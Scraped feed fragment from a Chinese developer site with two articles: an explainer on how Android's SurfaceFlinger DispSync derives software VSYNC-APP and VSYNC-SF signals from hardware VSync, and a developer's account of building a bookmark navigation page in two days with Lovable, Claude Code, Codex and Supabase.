(max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>关于VSync的产生，你需要彻底更新一个认知：<strong>Android系统里你看到的那些整齐的VSYNC-APP和VSYNC-SF信号，99%的时间里并不是硬件直接产生的，而是SurfaceFlinger用数学公式“算”出来的。</strong></p>
<p>为了把这个“算出来”的过程讲透，我们从<strong>物理源头</strong>、<strong>软件衍生</strong>、<strong>按需开关</strong>三个层面逐步拆解。</p>
<hr/>
<h2 data-id="heading-0">一、物理源头：硬件VSync的“原始脉搏”</h2>
<p>VSync这个概念的诞生比Android早几十年，它源自CRT显示器电子枪的物理动作。</p>
<p><strong>1.1 它最初是显示器“喘口气”的信号</strong></p>
<ul>
<li>电子枪从左到右、从上到下扫描屏幕，扫完一帧后必须<strong>关闭电子束、从右下角瞬间移回左上角</strong>（垂直回扫）。</li>
<li>这段短暂的“空窗期”会触发一个脉冲——<strong>垂直同步信号（VSync）</strong>，告诉显卡：“上一帧已显示完毕，可以送下一帧了”。</li>
<li>现代LCD虽无电子枪，但为了兼容，<strong>显示控制器（Display Controller）会模拟这个时序</strong>，通过硬件定时器产生固定频率的脉冲。这个频率就是屏幕刷新率（60Hz/90Hz/120Hz等）。</li>
</ul>
<p><strong>1.2 Android里谁在制造这个原始脉冲？</strong>
<strong>Hardware Composer（HWC）</strong>。它是显示驱动的一部分，直接与硬件定时器交互。每当屏幕完成一次刷新，HWC就通过回调向SurfaceFlinger发送一个<strong>HW_VSYNC_0</strong>信号。</p>
<p><strong>关键认知</strong>：这个硬件信号极其“原始”——它只是一串准确但<strong>没有任何业务逻辑</strong>的时间戳。它不知道谁是App、谁是SurfaceFlinger，只会每分钟60次（或更高）忠实地发出脉冲。</p>
<hr/>
<h2 data-id="heading-1">二、软件衍生：DispSync的“神算局”</h2>
<p>如果让App和SurfaceFlinger每次都直接响应HW_VSYNC_0，会有两个严重问题：</p>
<ol>
<li><strong>功耗灾难</strong>：即使屏幕静止不动（如看电子书），App和SF也会每16.6ms被唤醒，疯狂空转。</li>
<li><strong>相位死锁</strong>：App绘制、SF合成、屏幕显示三者<strong>挤在同一个时间点开工</strong>，流水线严重阻塞（旧Android版本的痛点）。</li>
</ol>
<p>于是Android 4.1（Project Butter）引入了<strong>DispSync模块</strong>——一个<strong>基于数学预测的软件VSync生成器</strong>。这是整个机制最精妙的部分。</p>
<p><strong>2.1 DispSync的工作原理：锁相环的软件实现</strong></p>
<p>DispSync本质上是一个<strong>数字锁相环（Digital Phase-Locked Loop）</strong>。它不依赖硬件中断实时触发，而是通过采样硬件VSync的历史时间，<strong>拟合出一条精准的“虚拟时钟线”</strong>。</p>
<p><strong>第一步：采样与建模</strong></p>
<ul>
<li>SurfaceFlinger会持续接收HW_VSYNC_0信号，但<strong>并不立刻分发</strong>。</li>
<li>DispSync收集<strong>至少3个、最多32个</strong>硬件VSync时间戳，通过最小二乘法或均值滤波计算出<strong>平均周期（AvgPeriod）<strong>和</strong>平均相位（AvgPhase）</strong>。</li>
<li>数学公式（简化版）：
<ul>
<li>将每个时间戳映射到单位圆角度：<code>ΔPhase = 2π * (timestamp % AvgPeriod) / AvgPeriod</code></li>
<li>计算所有采样点的平均向量 <code>(AvgX, AvgY)</code></li>
<li><code>SW_VSYNC相位 = atan2(AvgY, AvgX)</code></li>
<li>最终：<code>SW_VSYNC时间 = AvgPeriod + AvgPhase</code></li>
</ul>
</li>
</ul>
<p><strong>一旦模型误差收敛（通常6个采样后），DispSync会立即</strong>关闭硬件VSync中断**，完全靠这套数学模型产生后续的软件VSync。这就是“用计算代替中断”的核心节能设计。</p>
<p><strong>2.2 一源双生：VSYNC-APP与VSYNC-SF</strong></p>
<p>硬件只提供一个原始脉冲，但系统需要两个不同用途的节拍器。DispSync在生成软件VSync时，会<strong>直接产出两条相位偏移的时钟流</strong>：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">VSYNC-APP</span> = SW_VSYNC基准 + phase_app偏移量
<span class="hljs-attr">VSYNC-SF</span>  = SW_VSYNC基准 + phase_sf偏移量
</code></pre>
<ul>
<li><strong>phase_app</strong>：通常为0～2ms（应用先开始绘制）</li>
<li><strong>phase_sf</strong>：通常为4～6ms（SF稍后开始合成，刚好等App画完）</li>
</ul>
<p>这两条信号就是你在Systrace里看到的彩色VSync条。它们的<strong>周期完全一致（16.6ms）</strong>，但<strong>起始时间错开</strong>，形成流水线。</p>
<p><strong>对比总结</strong>（纠正常见误区）：</p>

































<table><thead><tr><th>信号名称</th><th>产生者</th><th>是否硬件直接发出</th><th>用途</th><th>触发方式</th></tr></thead><tbody><tr><td><strong>HW_VSYNC_0</strong></td><td>HWC/显示控制器</td><td>✅ 是</td><td>校准DispSync模型</td><td>硬件定时器，固定频率</td></tr><tr><td><strong>VSYNC-APP</strong></td><td>DispSync（软件）</td><td>❌ 否</td><td>触发Choreographer开始绘制</td><td>按需 + 模型预测</td></tr><tr><td><strong>VSYNC-SF</strong></td><td>DispSync（软件）</td><td>❌ 否</td><td>触发SurfaceFlinger合成</td><td>按需 + 模型预测</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">三、按需触发：没有绘制任务时，VSync去哪了？</h2>
<p>这是Android VSync机制最容易误解的地方：<strong>Systrace里VSync-APP/SF信号并非每16.6ms都有</strong>。它们的出现遵循**按需申请（requestNextVsync）**原则。</p>
<p><strong>3.1 为什么必须按需？</strong>
假设你打开一个静态文本页面：</p>
<ul>
<li>屏幕内容完全没有变化。</li>
<li>如果DispSync仍然每16.6ms向App发送VSYNC-APP，App的主线程会<strong>持续每帧执行doFrame()</strong>，空转测量布局绘制——CPU空耗、发热、掉电。</li>
<li><strong>完全没必要</strong>。</li>
</ul>
<p><strong>3.2 申请-触发机制</strong></p>
<ul>
<li><strong>App侧</strong>：只有当<code>Choreographer.postCallback()</code>被调用（如View.invalidate()、动画启动），才会通过Binder向SF的EventThread<strong>请求下一个VSYNC-APP</strong>。</li>
<li><strong>SF侧</strong>：只有当BufferQueue中有新Buffer入队，或者窗口状态变化，才会<strong>请求下一个VSYNC-SF</strong>。</li>
<li><strong>DispSync侧</strong>：只有当<strong>至少一个客户端在等待</strong>时，它才会在预测的时钟点上发射软件VSync；<strong>如果无人申请，DispSync保持静默</strong>，整个图形系统进入低功耗状态。</li>
</ul>
<p>这就是为什么Systrace里VSync信号<strong>时疏时密</strong>——动态场景（滑动、动画）密集出现；静态场景几乎消失。</p>
<p><strong>3.3 硬件VSync的重校准</strong>
当DispSync长期依靠软件预测，可能会因温漂、时钟偏差而产生相位误差。如何修正？</p>
<ul>
<li>SurfaceFlinger在<code>postComposition()</code>时会检查<strong>Present Fence</strong>（帧实际显示的时间戳）。</li>
<li>将这些Fence时间与SW_VSYNC预测时间对比，<strong>计算误差平方和</strong>。</li>
<li>若误差超过阈值（如1.5ms），DispSync会<strong>临时重新使能硬件VSync</strong>，采集3～6个新样本重新建模，然后再次关闭硬件VSync。</li>
</ul>
<p><strong>这是一套完整的闭环自适应系统：硬件提供基准，软件负责分发，误差触发校准。</strong></p>
<hr/>
<h2 data-id="heading-3">四、全景流程图（建议收藏）</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8084312655994ab488ebba90269caeea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-D5rqQeGlueXVhbg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771554981&amp;x-signature=BcMZxv%2BFCG0cUiPpuvlHXgW%2BQMY%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[显示控制器硬件定时器] --&gt;|固定频率脉冲| B[HWC产生HW_VSYNC_0]
    B --&gt; C{SurfaceFlinger DispSync}
    
    C --&gt;|采样至少3个时间戳| D[计算平均周期与相位]
    D --&gt;|模型收敛| E[关闭硬件VSync中断]
    E --&gt; F[软件预测生成SW_VSYNC基准时钟]
    
    F --&gt;|+ phase_app偏移| G[VSYNC-APP]
    F --&gt;|+ phase_sf偏移| H[VSYNC-SF]
    
    G --&gt;|按需：App调用requestNextVsync| I[触发Choreographer绘制]
    H --&gt;|按需：SF有Buffer待合成| J[触发SurfaceFlinger合成]
    
    I --&gt; K[GPU渲染完成]
    K --&gt; L[Buffer入队]
    L --&gt;|触发SF申请下一帧VSYNC-SF| J
    
    J --&gt; M[合成送显]
    M --&gt;|检查Present Fence误差| N{误差超阈值？}
    N --&gt;|是| O[临时开启硬件VSync]
    O --&gt;|重新采样| C
    N --&gt;|否| P[保持软件预测模式]
</code></pre>
<h2 data-id="heading-4">五、回答你最初的问题：“VSync是如何产生的？”</h2>
<p><strong>分三个层次回答：</strong></p>
<ol>
<li><strong>物理层</strong>：显示控制器硬件定时器每16.6ms产生一个脉冲，HWC捕获后作为HW_VSYNC_0上报。</li>
<li><strong>软件层</strong>：SurfaceFlinger的DispSync模块将硬件信号作为“校准样本”，通过锁相环算法<strong>拟合出一条持续运行的虚拟时钟线</strong>，并在这根时钟线上<strong>同时开出两条相位错开的信号通道</strong>（VSYNC-APP/VSYNC-SF）。</li>
<li><strong>策略层</strong>：这两条软件信号<strong>并非周期性自动发射</strong>，而是严格遵循<strong>按需申请</strong>机制——只有App或SF明确“我需要下一帧”，DispSync才在预测时间点发射信号。</li>
</ol>
<p><strong>所以，VSync的最终形态——你在Systrace里看到的那些彩色节拍——是“硬件定时校准 + 软件预测生成 + 按需触发”三者结合的产物。</strong> 它不是纯粹的硬件中断，也不是纯粹的操作系统时钟，而是Android为移动场景定制的<strong>自适应、低功耗同步引擎</strong>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[我一个后端,用AI做了个导航页,发现开发模式真的变了]]></title>    <link>https://juejin.cn/post/7605817795628482610</link>    <guid>https://juejin.cn/post/7605817795628482610</guid>    <pubDate>2026-02-13T02:36:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605817795628482610" data-draft-id="7605848213603778606" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="我一个后端,用AI做了个导航页,发现开发模式真的变了"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-02-13T02:36:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HUHA"/> <meta itemprop="url" content="https://juejin.cn/user/875627647347278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            我一个后端,用AI做了个导航页,发现开发模式真的变了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/875627647347278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HUHA
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:36:13.000Z" title="Fri Feb 13 2026 02:36:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"「"}.markdown-body b:after,.markdown-body strong:after{content:"」"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github-gist">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#333}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#d73a49}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-symbol{color:#0086b3}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#6f42c1}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.hljs-number{color:#005cc5}.hljs-string{color:#032f62}</style><p>说起来,春节前几天,我突然想做个自己的导航页。</p>
<p>为什么?因为浏览器书签太乱了。常用的开发工具、设计资源、AI工具散得到处都是。每次找都要半天。我想有个地方,把常用的链接都集中起来,还能按类别整理。</p>
<p>虽然我已经在用现成的自定义导航页产品了，但是我没法给他们提需求，他们也不可能会听，有些功能我想改，根本不可能！</p>
<p>我想拥有一个符合自己审美的导航页，于是它来了：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdh.huhage.fun%2F" target="_blank" title="https://dh.huhage.fun/" ref="nofollow noopener noreferrer">dh.huhage.fun/</a></p>
<p>作为后端开发,这个需求挺简单的。但问题来了,我不会写前端。</p>
<p>之前也试过学React、Vue,但每次都坚持不下来。组件、状态管理、样式——对我来说就像天书。所以这个想法就一直拖着,直到春节前几天,我突然想:能不能用AI试试?</p>
<p>结果,两天时间就搞定了。</p>
<p>用的工具链也很简单:Lovable做初版前端,Claude Code和Codex打磨,Supabase接入登录注册。整个过程出奇地顺利,几乎没有遇到什么阻碍。</p>
<p>让我先说说我为什么会选这几个工具。</p>
<h2 data-id="heading-0">为什么是Lovable</h2>
<p>一开始,我其实对比了好几个工具。</p>
<p>市面上的AI开发工具挺多的:Gemini、Bolt.new、ClaudeCode...我都试了一圈。</p>
<p>测试方法很简单,我用同样的Prompt让它们生成导航页:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 个性化导航页开发需求</span>
<span class="hljs-section">## 核心定位</span>
开发一款以极致UI设计为核心竞争力的个性化导航页产品“呼哈导航”，所有视觉元素需经过深度打磨，拒绝同质化、俗套化设计，将UI/UX体验作为核心优先级。

<span class="hljs-section">## 1. 设计要求</span>
<span class="hljs-bullet">-</span> 视觉风格：追求高级感与独特性，每个UI元素（按钮、卡片、图标、动效、配色、排版）均需精细化设计，避免通用模板化风格
<span class="hljs-bullet">-</span> 主题色切换：用户可以自己切换喜欢的主题色
<span class="hljs-bullet">-</span> 布局方案：提供至少3种差异化核心布局（如网格瀑布流、分类抽屉式、极简单列式），支持用户一键切换，每种布局需适配不同使用场景（高效查找、视觉沉浸、极简操作）
<span class="hljs-bullet">-</span> 多端兼容：全站采用响应式设计，移动端需做专属适配（如触控交互优化、竖屏布局重构、操作按钮放大），保证移动端体验与PC端一致优质
<span class="hljs-bullet">-</span> 支持暗黑模式和亮色模式切换
<span class="hljs-bullet">-</span> UI设计必须符合大厂设计规范，有大厂的设计风范

<span class="hljs-section">## 2. 核心功能</span>
<span class="hljs-section">### （1）自定义分类管理</span>
<span class="hljs-bullet">-</span> 用户可自主创建/编辑/删除网址分类（支持分类名称、分类图标、分类排序、分类背景自定义）
<span class="hljs-bullet">-</span> 分类支持层级管理（必须包含一级/二级分类），满足多维度整理需求

<span class="hljs-section">### （2）网址个性化管理</span>
<span class="hljs-bullet">-</span> 每个分类下支持用户添加自定义网址，可配置项包括：网址链接、显示名称、自定义图标（支持上传/选择内置图标/自动抓取网站favicon）、备注信息
<span class="hljs-bullet">-</span> 网址展示形式需精美化：支持卡片悬停动效、图标渐变、信息分层展示，避免单调列表式呈现

<span class="hljs-section">### （3）分享功能</span>
<span class="hljs-bullet">-</span> 支持用户生成自定义分享链接（可自定义链接后缀），分享后访客可直接查看该用户的导航页（只读权限）
<span class="hljs-bullet">-</span> 分享页需保持原设计风格，且适配移动端访问

<span class="hljs-section">### （4）用户系统</span>
<span class="hljs-bullet">-</span> 基础登录功能（支持邮箱/手机号验证，优先考虑Supabase Auth集成）
<span class="hljs-bullet">-</span> 登录后数据与用户账号绑定，支持多端同步

<span class="hljs-section">### （5）搜索功能</span>
<span class="hljs-bullet">-</span> 主页顶部展示搜索功能，可以切换搜索引擎，比如bing、百度、google
<span class="hljs-bullet">-</span> 也支持快速检索用户添加的网址

<span class="hljs-section">## 3. 技术与开发规划</span>
<span class="hljs-bullet">-</span> 数据库：使用Supabase，所有数据表统一前缀为dh<span class="hljs-emphasis">_（如dh_</span>users、dh<span class="hljs-emphasis">_categories、dh_</span>bookmarks）
<span class="hljs-bullet">-</span> 开发优先级：先完成前端UI/交互、核心功能逻辑，数据库相关开发后置（需预留数据对接接口）
<span class="hljs-bullet">-</span> 技术要求：前端需保证性能与视觉一致性，交互动效流畅不卡顿

<span class="hljs-section">## 4. 交付期望</span>
<span class="hljs-bullet">-</span> 清晰的设计稿（含多布局方案、移动端适配稿）
<span class="hljs-bullet">-</span> 可运行的前端原型（核心功能可交互）
<span class="hljs-bullet">-</span> 明确的数据库表结构设计（dh<span class="hljs-emphasis">_前缀）
- 功能实现的技术方案说明
</span></code></pre>
<p>Gemini生成的代码能用,但界面有点普通。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13ebfeaefc284b53b51ad845a952e39e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSFVIQQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771554972&amp;x-signature=2ozIquadck479uPx0hvRSIoQivs%3D" alt="" loading="lazy"/></p>
<p>Bolt.new也不错,但默认的设计模板太程序员审美了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b258c59c704547f59ffef5b571c32432~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSFVIQQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771554972&amp;x-signature=ZAeCAS%2BW7sC28mfFzsUKziSqyaE%3D" alt="" loading="lazy"/></p>
<p>Claude Code搭配GLM4.7不知道搞出了个什么玩意。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f5af5a5afa643bca62f7bc8dcddeb29~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSFVIQQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771554972&amp;x-signature=aevrZqGEqRQrwQsI5CzpHiQfJss%3D" alt="" loading="lazy"/></p>
<p>最后试了Lovable,一对比就发现了差距——它的UI更美观,默认生成的界面就很有设计感,不是那种"工程师审美"。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e1680820c0448e0829378532e76c8b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSFVIQQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771554972&amp;x-signature=tH5HwrUE1XjNDv1xtnVTTZlzaS8%3D" alt="" loading="lazy"/></p>
<p>这就是我选Lovable的原因:简单直接,好看就够了。</p>
<p>就这样,大概用了2小时,一个能用的导航页初版就出来了。</p>
<h2 data-id="heading-1">为什么用Claude Code和Codex</h2>
<p>初版能用,但还不够好。</p>
<p>比如,响应式布局有问题,在手机上打开会乱掉。还有一些细节:链接点击后的颜色、hover的效果、分类的展开收起动画...这些都需要调整。</p>
<p>这时候就需要Claude Code和Codex了。</p>
<p>Claude Code我之前就常用,它是个终端AI助手,能直接操作你的代码库。我先把Lovable生成的代码导出到本地,然后用Claude Code打开。</p>
<p>这个过程和我之前用Cursor有点像。但Claude Code的优势在于"项目级理解"——它不只是看单个文件,而是理解整个项目的结构,所以它能找到一些隐藏在多个文件之间的关联问题。</p>
<p>Codex的作用更偏向"细节打磨"。比如我想要给每个网站链接加上favicon图标,这个需求比较琐碎,需要逐个处理。</p>
<p>"帮我给所有外部链接加上自动获取favicon的功能",我对Codex说。</p>
<p>Codex自动分析了需求,写了一段JavaScript代码,调用Google的favicon API,自动为每个链接获取图标。</p>
<p>整个过程大概花了3小时,从初版到一个"看起来挺专业"的导航页,就完成了。</p>
<h2 data-id="heading-2">为什么用Supabase</h2>
<p>做到这一步,导航页已经能用了。但我觉得还缺了点什么。</p>
<p>既然是自己用的工具,能不能加上用户系统?这样我可以分享给朋友,大家都可以有自己的收藏夹。</p>
<p>后端这块我比较熟,所以第一反应就是需要一个数据库和用户认证系统。</p>
<p>之前用过Firebase,但配置起来挺麻烦的。后来听说了Supabase,说是开源版的Firebase,而且和AI工具集成得很好。</p>
<p>春节前那天下午,我注册了Supabase,创建了一个新项目。</p>
<p>然后我用Claude Code连接了Supabase的MCP:</p>
<p>"帮我为这个导航页添加登录注册功能,使用邮箱和密码认证。"</p>
<p>Claude Code自动创建了必要的数据库表,配置了认证策略,然后生成了登录和注册的前端组件。</p>
<p>整个过程不到1小时,登录注册功能就搞定了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cee24315fab4e769b1374c2c8d49c85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSFVIQQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771554972&amp;x-signature=UJ1EGMGfc5e1AQuNrGDoVQ0j1E4%3D" alt="" loading="lazy"/></p>
<p>而且Supabase不仅做了基本的认证,还自动包含了邮箱验证、密码重置这些功能。这些都是现成的,我不用自己写。</p>
<p>这时候我突然意识到,作为一个后端开发,如果是传统开发方式,光是用户认证这块,至少要花大半天时间。但现在用AI,1小时就搞定了。</p>
<h2 data-id="heading-3">2天完成一个全栈项目</h2>
<p>整个项目花了2天。</p>
<p>第一天用Lovable做初版,2小时搞定。</p>
<p>第二天用Claude Code和Codex打磨,3小时;用Supabase加登录注册,1小时。</p>
<p>剩下的时间主要是测试和微调。</p>
<p>而且整个过程没有遇到什么大坑。</p>
<p>这个速度让我有点意外。作为一个后端开发,如果自己从零学前端做这个项目,保守估计也要一周。而且做出来的效果肯定不如现在。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abff23ab626b422a9f09e7c09354df22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSFVIQQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771554972&amp;x-signature=1OwnV%2B1%2FiSp7xd8hs8XVMLNsTtI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">我学到了什么</h2>
<p>这个项目做完了,但我最大的收获不是导航页本身,而是对AI时代开发模式的思考。</p>
<p>技术门槛真的降低了。</p>
<p>我以前觉得,做全栈开发需要懂前端、后端、数据库、部署...这些东西要学几年。但现在有了AI工具,一个后端开发也能在两天内做出一个像样的全栈项目。</p>
<p>这不是说技术知识不重要了,而是说,AI把很多"重复劳动"和"模板代码"都自动化了。你只需要懂核心概念,剩下的交给AI。</p>
<p>工具的选择也很重要。</p>
<p>这个项目我用了4个AI工具,每个工具都有它擅长的地方:Lovable擅长快速原型,Claude Code擅长代码理解,Codex擅长细节处理,Supabase擅长后端集成。</p>
<p>没有哪个工具是万能的,但组合起来就很强大。</p>
<p>但我依然需要懂技术。</p>
<p>虽然AI帮我写了大部分代码,但我还是得知道什么是响应式布局,什么是JWT认证,什么是数据库表结构。不然我连需求都描述不清楚,更别说验证AI生成的代码对不对了。</p>
